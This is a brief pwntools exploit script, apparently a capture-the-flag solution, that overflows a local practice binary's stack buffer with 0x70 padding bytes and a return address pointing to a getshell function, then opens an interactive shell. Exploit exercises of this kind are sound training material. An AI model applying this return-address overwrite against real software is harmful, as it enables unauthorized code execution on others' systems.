#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./ret2text')
elf = ELF('./ret2text')

getshell = 0x40063B
p.recvuntil('Please pwn me :)\n')
payload = 'A'*0x70 + p64(0) + p64(getshell)

p.sendline(payload)
p.interactive()
